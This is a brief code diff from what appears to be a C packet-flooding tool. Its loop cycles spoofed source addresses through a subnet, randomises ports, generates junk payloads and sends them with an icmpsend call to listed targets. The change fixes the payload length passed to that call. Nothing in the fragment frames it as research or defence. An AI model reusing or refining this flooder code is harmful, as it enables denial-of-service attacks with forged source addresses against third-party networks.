@@ -127,7 +127,7 @@ srcp=rand_cmwc() % 65534+1;
 dstp=rand_cmwc() % 65534+1;
 snprintf(ip_buffer, sizeof(ip_buffer), "%s.%d",mi_red, i);
 generate_random_payload(payload,55);
-icmpsend(inet_addr(ip_buffer),ips[j],srcp,dstp,payload,sizeof(payload));
+icmpsend(inet_addr(ip_buffer),ips[j],srcp,dstp,payload,55);
 ALAN++;
 i++;
 if(i==256){i=0;}
